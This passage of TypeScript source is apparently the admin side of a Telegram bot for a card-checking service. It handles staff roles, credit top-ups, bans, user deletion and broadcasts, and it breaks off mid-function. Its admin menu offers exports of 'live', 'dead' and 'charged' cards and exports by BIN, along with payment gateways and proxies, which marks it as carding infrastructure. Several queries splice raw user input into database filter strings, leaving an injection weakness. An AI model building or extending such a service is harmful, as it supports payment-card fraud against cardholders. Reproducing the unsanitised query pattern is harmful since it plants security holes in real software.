      [{ text: "🔍 User Info", callback_data: "mod_userinfo" }, { text: "🚫 View Bans", callback_data: "mod_viewbans" }],
      [{ text: "🔙 Back to Menu", callback_data: "menu_back" }]
    ] };
    if (messageId) {
      await editTelegramMessage(chatId, messageId, modMenu, modKeyboard);
    } else {
      await sendTelegramMessage(chatId, modMenu, modKeyboard);
    }
    return;
  }

  // Admin menu (full)
  let menu = `
🔐 <b>Admin Panel</b>

<b>📋 Tickets</b>
/ticket <code>[id]</code> - Manage ticket

<b>💰 Finance</b>
/topups - Pending requests
/rejectall - Reject all pending
/addfund <code>[email] [amount]</code> - Add/deduct credits

<b>👥 Users</b>
/banuser <code>[user]</code> - Ban user
/unbanuser <code>[user]</code> - Unban user
/deleteuser <code>[user]</code> - Delete user
/deletealluser - Delete all users
/cancelban - Cancel pending ban
/viewbans - View banned users

<b>🚫 Device Blocking</b>
/viewblocked - View blocked devices/IPs
/blockdevice <code>[type] [value]</code> - Block device/IP
/unblockdevice <code>[id]</code> - Unblock device/IP
/userdevices <code>[user]</code> - View user's devices

<b>📊 Data & Analytics</b>
/stats - View statistics
/allusers - List all users
/userinfo <code>[user]</code> - User details
/cardstats - Real-time card stats

<b>📁 Card Exports</b>
/allcards - Export all cards
/livecards - Export live cards
/deadcards - Export dead cards
/chargedcards - Export charged cards
/bincard <code>[bin]</code> - Export by BIN

<b>📢 Communication</b>
/broadcast <code>[message]</code> - Send to all users
<i>Add |link:URL at end for clickable button</i>

<b>🌐 Gateways</b>
/gate - Set gateway availability
/addgate - Add new gateway
/editgate <code>[id]</code> - Edit gateway config
/delgate <code>[id]</code> - Delete gateway
/healthsites - Health check sites
/addurl <code>[urls]</code> - Add URLs for health check
/clearurls - Clear all URLs
/urlcount - View total URLs
/addproxy <code>[ip:port:user:pass]</code> - Add proxy
/proxies - View saved proxies
/delproxy <code>[id]</code> - Delete proxy

<b>👮 Moderation</b>
/promote <code>[chat_id]</code> - Promote to moderator
/demote <code>[chat_id]</code> - Demote moderator`;

  // Super admin only commands
  if (isSuperAdmin(chatId)) {
    menu += `

<b>🛡️ Admin Management</b> <i>(Super Admin)</i>
/grantadmin <code>[chat_id]</code> - Grant admin
/revokeadmin <code>[chat_id]</code> - Revoke admin
/admins - List admins & mods`;
  }

  const adminKeyboard = { inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "menu_back" }]] };
  if (messageId) {
    await editTelegramMessage(chatId, messageId, menu, adminKeyboard);
  } else {
    await sendTelegramMessage(chatId, menu, adminKeyboard);
  }
}

// ═══════════════════════════════════════════════════════════
// ADMIN MANAGEMENT HANDLERS
// ═══════════════════════════════════════════════════════════

async function handleGrantAdmin(chatId: string, args: string, supabase: any): Promise<void> {
  if (!isSuperAdmin(chatId)) {
    await sendTelegramMessage(chatId, "❌ Only super admin can grant admin access");
    return;
  }

  const targetChatId = args.trim();
  if (!targetChatId) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /grantadmin <code>[telegram_chat_id]</code>

Example: /grantadmin 123456789
`);
    return;
  }

  // Find user by telegram chat ID
  const { data: profile } = await supabase
    .from("profiles")
    .select("user_id, username, telegram_username")
    .eq("telegram_chat_id", targetChatId)
    .maybeSingle();

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ No user found with Telegram Chat ID: ${targetChatId}`);
    return;
  }

  // Check if already admin
  const { data: existingRole } = await supabase
    .from("user_roles")
    .select("id")
    .eq("user_id", profile.user_id)
    .eq("role", "admin")
    .maybeSingle();

  if (existingRole) {
    await sendTelegramMessage(chatId, `⚠️ User <b>${profile.username || targetChatId}</b> is already an admin`);
    return;
  }

  // Grant admin role
  const { error } = await supabase
    .from("user_roles")
    .insert({ user_id: profile.user_id, role: "admin" });

  if (error) {
    console.error("Error granting admin:", error);
    await sendTelegramMessage(chatId, "❌ Failed to grant admin access");
    return;
  }

  // Notify the new admin
  await sendTelegramMessage(targetChatId, `
🎉 <b>Admin Access Granted</b>

You have been granted admin access to the bot.
Use /admincmd to view available commands.
`);

  await sendTelegramMessage(chatId, `
✅ <b>Admin Granted</b>

<b>User:</b> ${profile.username || "Unknown"}
<b>Telegram:</b> @${profile.telegram_username || targetChatId}
<b>Chat ID:</b> <code>${targetChatId}</code>

User can now use admin commands.
`);
}

async function handleRevokeAdmin(chatId: string, args: string, supabase: any): Promise<void> {
  if (!isSuperAdmin(chatId)) {
    await sendTelegramMessage(chatId, "❌ Only super admin can revoke admin access");
    return;
  }

  const targetChatId = args.trim();
  if (!targetChatId) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /revokeadmin <code>[telegram_chat_id]</code>

Example: /revokeadmin 123456789
`);
    return;
  }

  if (targetChatId === ADMIN_CHAT_ID) {
    await sendTelegramMessage(chatId, "❌ Cannot revoke super admin access");
    return;
  }

  // Find user by telegram chat ID
  const { data: profile } = await supabase
    .from("profiles")
    .select("user_id, username, telegram_username")
    .eq("telegram_chat_id", targetChatId)
    .maybeSingle();

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ No user found with Telegram Chat ID: ${targetChatId}`);
    return;
  }

  // Check if user is admin
  const { data: existingRole } = await supabase
    .from("user_roles")
    .select("id")
    .eq("user_id", profile.user_id)
    .eq("role", "admin")
    .maybeSingle();

  if (!existingRole) {
    await sendTelegramMessage(chatId, `⚠️ User <b>${profile.username || targetChatId}</b> is not an admin`);
    return;
  }

  // Revoke admin role
  const { error } = await supabase
    .from("user_roles")
    .delete()
    .eq("user_id", profile.user_id)
    .eq("role", "admin");

  if (error) {
    console.error("Error revoking admin:", error);
    await sendTelegramMessage(chatId, "❌ Failed to revoke admin access");
    return;
  }

  // Notify the former admin
  await sendTelegramMessage(targetChatId, `
⚠️ <b>Admin Access Revoked</b>

Your admin access has been revoked.
`);

  await sendTelegramMessage(chatId, `
✅ <b>Admin Revoked</b>

<b>User:</b> ${profile.username || "Unknown"}
<b>Telegram:</b> @${profile.telegram_username || targetChatId}
<b>Chat ID:</b> <code>${targetChatId}</code>

User can no longer use admin commands.
`);
}

async function handleListAdmins(chatId: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  // Get all users with admin role
  const { data: adminRoles } = await supabase
    .from("user_roles")
    .select("user_id")
    .eq("role", "admin");

  // Get all users with moderator role
  const { data: modRoles } = await supabase
    .from("user_roles")
    .select("user_id")
    .eq("role", "moderator");

  const adminUserIds = adminRoles?.map((r: any) => r.user_id) || [];
  const modUserIds = modRoles?.map((r: any) => r.user_id) || [];

  let list = `
👑 <b>Super Admin</b>
   🆔 <code>${ADMIN_CHAT_ID}</code>
`;

  // Admins
  if (adminUserIds.length > 0) {
    const { data: profiles } = await supabase
      .from("profiles")
      .select("user_id, username, telegram_username, telegram_chat_id")
      .in("user_id", adminUserIds);

    if (profiles && profiles.length > 0) {
      list += `
<b>🔴 Admins</b> (${profiles.length})`;
      profiles.forEach((p: any, i: number) => {
        list += `
${i + 1}. <b>${p.username || "Unknown"}</b>
   @${p.telegram_username || "N/A"} | 🆔 <code>${p.telegram_chat_id || "N/A"}</code>`;
      });
    }
  } else {
    list += `
<i>No additional admins</i>`;
  }

  // Moderators
  if (modUserIds.length > 0) {
    const { data: profiles } = await supabase
      .from("profiles")
      .select("user_id, username, telegram_username, telegram_chat_id")
      .in("user_id", modUserIds);

    if (profiles && profiles.length > 0) {
      list += `

<b>🟡 Moderators</b> (${profiles.length})`;
      profiles.forEach((p: any, i: number) => {
        list += `
${i + 1}. <b>${p.username || "Unknown"}</b>
   @${p.telegram_username || "N/A"} | 🆔 <code>${p.telegram_chat_id || "N/A"}</code>`;
      });
    }
  } else {
    list += `

<i>No moderators</i>`;
  }

  await sendTelegramMessage(chatId, `
🛡️ <b>Staff List</b>
${list}
`);
}

// ═══════════════════════════════════════════════════════════
// MODERATOR MANAGEMENT HANDLERS
// ═══════════════════════════════════════════════════════════

async function handlePromote(chatId: string, args: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Only admins can promote moderators");
    return;
  }

  const targetChatId = args.trim();
  if (!targetChatId) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /promote <code>[telegram_chat_id]</code>

Example: /promote 123456789
`);
    return;
  }

  // Find user by telegram chat ID
  const { data: profile } = await supabase
    .from("profiles")
    .select("user_id, username, telegram_username")
    .eq("telegram_chat_id", targetChatId)
    .maybeSingle();

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ No user found with Telegram Chat ID: ${targetChatId}`);
    return;
  }

  // Check if already has a role
  const { data: existingRole } = await supabase
    .from("user_roles")
    .select("role")
    .eq("user_id", profile.user_id)
    .maybeSingle();

  if (existingRole) {
    await sendTelegramMessage(chatId, `⚠️ User <b>${profile.username || targetChatId}</b> already has role: ${existingRole.role}`);
    return;
  }

  // Grant moderator role
  const { error } = await supabase
    .from("user_roles")
    .insert({ user_id: profile.user_id, role: "moderator" });

  if (error) {
    console.error("Error promoting moderator:", error);
    await sendTelegramMessage(chatId, "❌ Failed to promote to moderator");
    return;
  }

  // Notify the new moderator
  await sendTelegramMessage(targetChatId, `
🎉 <b>Moderator Access Granted</b>

You have been promoted to <b>Moderator</b>.
Use /admincmd to view your available commands.

<b>✅ What You CAN Do:</b>
• 📋 View &amp; reply to support tickets
• 💰 Add credits to users (/addfund)
• 📊 View platform statistics (/stats)
• 👥 List all users (/allusers)
• 🔍 View detailed user info (/userinfo) — <i>view only, no actions</i>
• 🚫 View banned users list (/viewbans)
• 📂 Access the Moderator Panel (/admincmd)

<b>❌ What You CANNOT Do:</b>
• Ban / Unban users
• Deduct credits from users
• Delete users
• Approve or reject topups
• Broadcast messages
• Manage gateways
• Block / Unblock devices
• Export card data
• Promote / Demote staff
• Grant / Revoke admin access
`);

  await sendTelegramMessage(chatId, `
✅ <b>Promoted to Moderator</b>

<b>User:</b> ${profile.username || "Unknown"}
<b>Telegram:</b> @${profile.telegram_username || targetChatId}
<b>Chat ID:</b> <code>${targetChatId}</code>

<b>Granted Permissions:</b>
• View &amp; reply to support tickets
• Add credits to users (no deductions)
• View stats, user list, user info (read-only)
• View banned users list

User has been notified of their new role.
`);
}

async function handleDemote(chatId: string, args: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Only admins can demote moderators");
    return;
  }

  const targetChatId = args.trim();
  if (!targetChatId) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /demote <code>[telegram_chat_id]</code>

Example: /demote 123456789
`);
    return;
  }

  // Find user by telegram chat ID
  const { data: profile } = await supabase
    .from("profiles")
    .select("user_id, username, telegram_username")
    .eq("telegram_chat_id", targetChatId)
    .maybeSingle();

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ No user found with Telegram Chat ID: ${targetChatId}`);
    return;
  }

  // Check if user is moderator
  const { data: existingRole } = await supabase
    .from("user_roles")
    .select("id, role")
    .eq("user_id", profile.user_id)
    .eq("role", "moderator")
    .maybeSingle();

  if (!existingRole) {
    await sendTelegramMessage(chatId, `⚠️ User <b>${profile.username || targetChatId}</b> is not a moderator`);
    return;
  }

  // Revoke moderator role
  const { error } = await supabase
    .from("user_roles")
    .delete()
    .eq("user_id", profile.user_id)
    .eq("role", "moderator");

  if (error) {
    console.error("Error demoting moderator:", error);
    await sendTelegramMessage(chatId, "❌ Failed to demote moderator");
    return;
  }

  // Notify the former moderator
  await sendTelegramMessage(targetChatId, `
⚠️ <b>Moderator Access Revoked</b>

Your moderator access has been revoked.
`);

  await sendTelegramMessage(chatId, `
✅ <b>Demoted from Moderator</b>

<b>User:</b> ${profile.username || "Unknown"}
<b>Telegram:</b> @${profile.telegram_username || targetChatId}
<b>Chat ID:</b> <code>${targetChatId}</code>

User can no longer use moderator commands.
`);
}

async function handleAddFund(chatId: string, args: string, supabase: any): Promise<void> {
  const isAdminUser = await isAdminAsync(chatId, supabase);
  const isModUser = await isModeratorAsync(chatId, supabase);
  const isStaff = isAdminUser || isModUser;
  console.log(`[handleAddFund] chatId=${chatId}, isAdmin=${isAdminUser}, isMod=${isModUser}, isStaff=${isStaff}`);
  if (!isStaff) {
    await sendTelegramMessage(chatId, "❌ Access denied. You need Admin or Moderator role to use /addfund.");
    return;
  }

  const parts = args.trim().split(/\s+/);
  if (parts.length < 2) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /addfund <code>[email] [amount]</code>

Examples:
• /addfund user@email.com 50
• /addfund user@email.com -100 (deduct)
`);
    return;
  }

  const email = parts[0].toLowerCase();
  const amount = parseFloat(parts[1]);

  if (isNaN(amount) || amount === 0) {
    await sendTelegramMessage(chatId, "❌ Invalid amount");
    return;
  }

  // Moderators can only add credits, not deduct
  if (!isAdminUser && amount < 0) {
    await sendTelegramMessage(chatId, "❌ Moderators can only add credits, not deduct. Contact an admin for deductions.");
    return;
  }

  const { data: authData } = await supabase.auth.admin.listUsers();
  const foundUser = authData?.users?.find((u: any) => u.email?.toLowerCase() === email);

  if (!foundUser) {
    await sendTelegramMessage(chatId, `❌ User not found: ${email}`);
    return;
  }

  const { data: profile } = await supabase
    .from("profiles")
    .select("username, credits, telegram_chat_id")
    .eq("user_id", foundUser.id)
    .single();

  if (!profile) {
    await sendTelegramMessage(chatId, "❌ Profile not found");
    return;
  }

  const oldCredits = Number(profile.credits) || 0;
  const newCredits = oldCredits + amount;

  if (newCredits < 0) {
    await sendTelegramMessage(chatId, `❌ Insufficient credits. Current: ${oldCredits}`);
    return;
  }

  await supabase
    .from("profiles")
    .update({ credits: newCredits, updated_at: new Date().toISOString() })
    .eq("user_id", foundUser.id);

  const action = amount > 0 ? "Added" : "Deducted";
  const emoji = amount > 0 ? "💰" : "💸";

  // Notify user via in-app notification
  await supabase.from("notifications").insert({
    user_id: foundUser.id,
    type: "credits_admin",
    title: `Credits ${action}`,
    message: `${Math.abs(amount)} credits ${action.toLowerCase()}. New balance: ${newCredits}`,
    metadata: { old_credits: oldCredits, new_credits: newCredits, amount }
  });

  // Send Telegram notification to user
  if (profile.telegram_chat_id) {
    await sendTelegramMessage(profile.telegram_chat_id, `
${emoji} <b>Credits ${action}</b>

${action}: ${Math.abs(amount)} credits
New Balance: ${newCredits} credits
`);
  }

  // Send email notification for credit additions only
  if (amount > 0) {
    try {
      await fetch(`${SUPABASE_URL}/functions/v1/notify-credit-addition`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
        },
        body: JSON.stringify({
          user_id: foundUser.id,
          amount: amount,
          old_credits: oldCredits,
          new_credits: newCredits,
          source: "admin"
        }),
      });
    } catch (err) {
      console.error("Error calling notify-credit-addition:", err);
    }
  }

  await sendTelegramMessage(chatId, `
✅ <b>Credits Updated</b>

👤 ${profile.username || email}
${action}: ${Math.abs(amount)} credits
Balance: ${oldCredits} → ${newCredits}
`);
}

async function handleTopups(chatId: string, supabase: any, page: number = 0): Promise<{ message: string; keyboard: object | null }> {
  const hasAccess = await isStaffAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return { message: "", keyboard: null };
  }

  const perPage = 5;
  
  // Fetch transactions without join (no FK relationship exists)
  const { data: topups, count } = await supabase
    .from("topup_transactions")
    .select("id, user_id, amount, payment_method, created_at", { count: "exact" })
    .eq("status", "pending")
    .order("created_at", { ascending: false });

  // Fetch profiles separately for usernames
  const enrichedTopups = [];
  if (topups && topups.length > 0) {
    for (const topup of topups) {
      const { data: profile } = await supabase
        .from("profiles")
        .select("username")
        .eq("user_id", topup.user_id)
        .maybeSingle();
      
      enrichedTopups.push({
        ...topup,
        username: profile?.username || "Unknown"
      });
    }
  }

  return buildTopupsListMessage(enrichedTopups, page, count || 0, perPage);
}

// Handle reject all pending topups
async function handleRejectAllTopups(chatId: string, supabase: any, messageId?: number, reason?: string): Promise<void> {
  const hasAccess = await isStaffAsync(chatId, supabase);
  if (!hasAccess) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Access denied");
    } else {
      await sendTelegramMessage(chatId, "❌ Access denied");
    }
    return;
  }

  // Get all pending topups
  const { data: pendingTopups, error: fetchError } = await supabase
    .from("topup_transactions")
    .select("id, user_id, amount")
    .eq("status", "pending");

  if (fetchError) {
    console.error("Error fetching pending topups:", fetchError);
    const errorMsg = "❌ Failed to fetch pending topups";
    if (messageId) {
      await editTelegramMessage(chatId, messageId, errorMsg);
    } else {
      await sendTelegramMessage(chatId, errorMsg);
    }
    return;
  }

  if (!pendingTopups || pendingTopups.length === 0) {
    const noTopupsMsg = "✅ No pending topups to reject";
    if (messageId) {
      await editTelegramMessage(chatId, messageId, noTopupsMsg);
    } else {
      await sendTelegramMessage(chatId, noTopupsMsg);
    }
    return;
  }

  const totalCount = pendingTopups.length;
  const totalCredits = pendingTopups.reduce((sum: number, t: any) => sum + Number(t.amount), 0);
  const rejectionReason = reason || "Bulk rejected by admin";

  // Update all pending transactions to failed
  const pendingIds = pendingTopups.map((t: any) => t.id);
  const { error: updateError } = await supabase
    .from("topup_transactions")
    .update({
      status: "failed",
      rejection_reason: rejectionReason,
      updated_at: new Date().toISOString()
    })
    .in("id", pendingIds);

  if (updateError) {
    console.error("Error rejecting topups:", updateError);
    const errorMsg = "❌ Failed to reject topups";
    if (messageId) {
      await editTelegramMessage(chatId, messageId, errorMsg);
    } else {
      await sendTelegramMessage(chatId, errorMsg);
    }
    return;
  }

  // Notify each affected user
  const userIds = [...new Set(pendingTopups.map((t: any) => t.user_id))];
  for (const userId of userIds) {
    const { data: profile } = await supabase
      .from("profiles")
      .select("telegram_chat_id")
      .eq("user_id", userId)
      .maybeSingle();

    if (profile?.telegram_chat_id) {
      const userTopups = pendingTopups.filter((t: any) => t.user_id === userId);
      const userCredits = userTopups.reduce((sum: number, t: any) => sum + Number(t.amount), 0);
      await sendTelegramMessage(
        profile.telegram_chat_id,
        `❌ <b>Topup Rejected</b>\n\nYour pending topup request(s) for ${userCredits.toLocaleString()} credits have been rejected.\n\n<b>Reason:</b> ${rejectionReason}`
      );
    }
  }

  const successMsg = `
🗑️ <b>All Pending Topups Rejected</b>

✅ <b>Rejected:</b> ${totalCount} requests
💰 <b>Total Credits:</b> ${totalCredits.toLocaleString()}
📋 <b>Reason:</b> ${rejectionReason}

<i>All affected users have been notified.</i>
`;

  const backKeyboard = { inline_keyboard: [[{ text: "🔙 Back to Topups", callback_data: "topups_refresh" }]] };

  if (messageId) {
    await editTelegramMessage(chatId, messageId, successMsg, backKeyboard);
  } else {
    await sendTelegramMessage(chatId, successMsg, backKeyboard);
  }
}

async function handleDeleteUser(chatId: string, identifier: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /deleteuser <code>[username/email/chat_id]</code>");
    return;
  }

  let userId: string | null = null;
  let userInfo: any = null;
  let userEmail: string | null = null;

  const { data: profile } = await supabase
    .from("profiles")
    .select("*")
    .or(`username.ilike.${identifier},telegram_chat_id.eq.${identifier}`)
    .maybeSingle();

  if (profile) {
    userId = profile.user_id;
    userInfo = profile;
    const { data: authData } = await supabase.auth.admin.listUsers();
    userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || null;
  } else {
    const { data: authData } = await supabase.auth.admin.listUsers();
    const foundUser = authData?.users?.find((u: any) => u.email?.toLowerCase() === identifier.toLowerCase());
    if (foundUser) {
      userId = foundUser.id;
      userEmail = foundUser.email;
      const { data: p } = await supabase.from("profiles").select("*").eq("user_id", foundUser.id).maybeSingle();
      userInfo = p;
    }
  }

  if (!userId) {
    await sendTelegramMessage(chatId, `❌ User not found: ${identifier}`);
    return;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "⚠️ CONFIRM DELETE", callback_data: `delete_confirm_${userId}` },
        { text: "❌ Cancel", callback_data: `delete_cancel_${userId}` },
      ],
    ],
  };

  await sendTelegramMessage(chatId, `
⚠️ <b>Delete User?</b>

👤 ${userInfo?.username || "Unknown"}
📧 ${userEmail || "Unknown"}
💰 ${userInfo?.credits || 0} credits

This will permanently delete all user data.
`, keyboard);
}

async function executeUserDeletion(chatId: string, userId: string, supabase: any): Promise<{ success: boolean; error?: string }> {
  try {
    const { data: profile } = await supabase
      .from("profiles")
      .select("telegram_chat_id")
      .eq("user_id", userId)
      .maybeSingle();

    const { data: tickets } = await supabase.from("support_tickets").select("id").eq("user_id", userId);
    if (tickets?.length > 0) {
      await supabase.from("ticket_messages").delete().in("ticket_id", tickets.map((t: any) => t.id));
    }

    const tables = ["support_tickets", "notifications", "notification_reads", "deleted_notifications", 
                    "card_checks", "user_sessions", "user_roles", "ban_appeals", "password_reset_otps", 
                    "pending_bans", "profiles", "spending_alert_settings", "topup_transactions", "deletion_otps"];
    
    for (const table of tables) {
      await supabase.from(table).delete().eq("user_id", userId);
    }

    if (profile?.telegram_chat_id) {
      await supabase.from("pending_verifications").delete().eq("telegram_chat_id", profile.telegram_chat_id);
    }

    const { error } = await supabase.auth.admin.deleteUser(userId);
    if (error) return { success: false, error: error.message };

    return { success: true };
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

async function handleDeleteAllUsers(chatId: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  const { count } = await supabase.from("profiles").select("*", { count: "exact", head: true });

  if (!count) {
    await sendTelegramMessage(chatId, "ℹ️ No users to delete");
    return;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "☠️ DELETE ALL", callback_data: "deleteall_confirm_step1" },
        { text: "❌ Cancel", callback_data: "deleteall_cancel" },
      ],
    ],
  };

  await sendTelegramMessage(chatId, `
☠️ <b>Delete ALL Users?</b>

Total users: ${count}

⚠️ This is irreversible!
`, keyboard);
}

async function executeDeleteAllUsers(chatId: string, supabase: any): Promise<void> {
  await sendTelegramMessage(chatId, "🔄 Deleting all users...");

  const { data: profiles } = await supabase.from("profiles").select("user_id");
  if (!profiles?.length) {
    await sendTelegramMessage(chatId, "ℹ️ No users to delete");
    return;
  }

  let deleted = 0, failed = 0;
  for (const p of profiles) {
    const result = await executeUserDeletion(chatId, p.user_id, supabase);
    result.success ? deleted++ : failed++;
  }

  await sendTelegramMessage(chatId, `
✅ <b>Delete Complete</b>

Deleted: ${deleted}
Failed: ${failed}
`);
}

async function handleBanUser(chatId: string, identifier: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /banuser <code>[username/email/chat_id]</code>");
    return;
  }

  let userId: string | null = null;
  let userEmail: string | null = null;
  let userTelegramChatId: string | null = null;
  let username: string | null = null;

  const { data: profile } = await supabase
    .from("profiles")
    .select("*")
    .or(`username.ilike.${identifier},telegram_chat_id.eq.${identifier}`)
    .maybeSingle();

  if (profile) {
    userId = profile.user_id;
    userTelegramChatId = profile.telegram_chat_id;
    username = profile.username;
    const { data: authData } = await supabase.auth.admin.listUsers();
    userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || null;
  } else {
    const { data: authData } = await supabase.auth.admin.listUsers();
    const foundUser = authData?.users?.find((u: any) => u.email?.toLowerCase() === identifier.toLowerCase());
    if (foundUser) {
      userId = foundUser.id;
      userEmail = foundUser.email;
      const { data: p } = await supabase.from("profiles").select("*").eq("user_id", foundUser.id).maybeSingle();
      userTelegramChatId = p?.telegram_chat_id || null;
      username = p?.username || null;
    }
  }

  if (!userId) {
    await sendTelegramMessage(chatId, `❌ User not found: ${identifier}`);
    return;
  }

  await supabase.from("pending_bans").insert({
    user_id: userId,
    admin_chat_id: chatId,
    user_email: userEmail,
    user_telegram_chat_id: userTelegramChatId,
    username: username,
    step: "reason"
  });

  await sendTelegramMessage(chatId, `
🔨 <b>Banning: ${username || userEmail}</b>

Reply with the ban reason:
(or /cancelban to abort)
`);
}

async function handleCancelBan(chatId: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  const { data: pendingBan } = await supabase
    .from("pending_bans")
    .select("*")
    .eq("admin_chat_id", chatId)
    .maybeSingle();

  if (!pendingBan) {
    await sendTelegramMessage(chatId, "ℹ️ No pending ban to cancel");
    return;
  }

  await supabase.from("pending_bans").delete().eq("admin_chat_id", chatId);
  await sendTelegramMessage(chatId, "✅ Ban cancelled");
}

async function handleUnbanUser(chatId: string, identifier: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /unbanuser <code>[username/email/chat_id]</code>");
    return;
  }

  const { data: profile } = await supabase
    .from("profiles")
    .select("*")
    .eq("is_banned", true)
    .or(`username.ilike.${identifier},telegram_chat_id.eq.${identifier},user_id.eq.${identifier}`)
    .maybeSingle();

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ Banned user not found: ${identifier}`);
    return;
  }

  await supabase
    .from("profiles")
    .update({ is_banned: false, ban_reason: null, banned_at: null, banned_until: null })
    .eq("user_id", profile.user_id);

  // Remove device/IP blocks for this user
  await supabase
    .from("blocked_devices")
    .update({ is_active: false })
    .eq("banned_user_id", profile.user_id);

  // Get user email for notification
  const { data: authUsers } = await supabase.auth.admin.listUsers();
  const userEmail = authUsers?.users?.find((u: any) => u.id === profile.user_id)?.email;

  // Send Telegram notification
  if (profile.telegram_chat_id) {
    await sendTelegramMessage(profile.telegram_chat_id, "✅ Your account has been unbanned!");
  }

  // Send email notification
  if (userEmail) {
    await sendUnbanEmail(userEmail, profile.username);
  }

  await sendTelegramMessage(chatId, `✅ Unbanned: ${profile.username || profile.user_id}`);
}

async function handleBroadcast(chatId: string, message: string, supabase: any): Promise<void> {
  const hasAccess = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  if (!message) {
    await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /broadcast <code>[message]</code>\n\nOptional: add <code>|link:URL</code> at the end to include a clickable button.\nExample: <code>/broadcast Hello everyone! |link:https://yunchicheck.com</code>");
    return;
  }

  // Extract optional link from message using |link:URL pattern
  let broadcastLink: string | null = null;
  let cleanMessage = message;
  const linkMatch = message.match(/\|link:(https?:\/\/\S+)\s*$/i);
  if (linkMatch) {
    broadcastLink = linkMatch[1];
    cleanMessage = message.replace(/\s*\|link:https?:\/\/\S+\s*$/i, "").trim();
  }

  // Use paginated fetch to get ALL users (bypasses 1000 row limit)
  const profiles = await fetchAllRecords(supabase, "profiles", "user_id, telegram_chat_id, username");
  if (!profiles?.length) {
    await sendTelegramMessage(chatId, "ℹ️ No users to broadcast to");
    return;
  }

  // Paginate auth users to get ALL emails
  const userEmailMap: Record<string, string> = {};
  let authPage = 1;
  const AUTH_PAGE_SIZE = 1000;
  while (true) {
    const { data: authUsers, error: authErr } = await supabase.auth.admin.listUsers({ page: authPage, perPage: AUTH_PAGE_SIZE });
    if (authErr || !authUsers?.users?.length) break;
    for (const user of authUsers.users) {
      if (user.email) userEmailMap[user.id] = user.email;
    }
    if (authUsers.users.length < AUTH_PAGE_SIZE) break;
    authPage++;
  }

  // Get email preferences for all users (paginated)
  const emailPreferences = await fetchAllRecords(supabase, "notification_preferences", "user_id, email_announcements");
  const emailOptOutMap: Record<string, boolean> = {};
  if (emailPreferences) {
    for (const pref of emailPreferences) {
      emailOptOutMap[pref.user_id] = pref.email_announcements === false;
    }
  }

  let telegramSent = 0, webSent = 0, emailSent = 0, emailSkipped = 0;
  const totalWithEmail = profiles.filter((p: any) => userEmailMap[p.user_id]).length;

  await sendTelegramMessage(chatId, `📡 Broadcasting to ${profiles.length} users...`);

  // Process in batches of 25 for Telegram, bulk insert for web notifications
  const BATCH_SIZE = 25;
  for (let i = 0; i < profiles.length; i += BATCH_SIZE) {
    const batch = profiles.slice(i, i + BATCH_SIZE);

    // Send Telegram messages in parallel within batch
    const telegramPromises = batch
      .filter((p: any) => p.telegram_chat_id)
      .map((p: any) => {
        const telegramMsg = `📢 <b>Announcement</b>\n\n${cleanMessage}${broadcastLink ? `\n\n🔗 <a href="${broadcastLink}">Open Link</a>` : ""}`;
        const replyMarkup = broadcastLink ? { inline_keyboard: [[{ text: "🔗 Open Link", url: broadcastLink }]] } : undefined;
        return sendTelegramMessage(p.telegram_chat_id, telegramMsg, replyMarkup);
      });
    const telegramResults = await Promise.allSettled(telegramPromises);
    telegramSent += telegramResults.filter(r => r.status === "fulfilled" && r.value === true).length;

    // Bulk insert web notifications
    const webNotifications = batch.map((p: any) => ({
      user_id: p.user_id,
      type: "announcement",
      title: "Announcement",
      message: cleanMessage,
      metadata: broadcastLink ? { link_url: broadcastLink, link_label: "Open Link" } : undefined,
    }));
    const { error: insertErr } = await supabase.from("notifications").insert(webNotifications);
    if (!insertErr) webSent += batch.length;

    // Send emails sequentially within batch (rate limit)
    for (const p of batch) {
      const userEmail = userEmailMap[p.user_id];
      if (userEmail) {
        if (emailOptOutMap[p.user_id]) {
          emailSkipped++;
        } else {
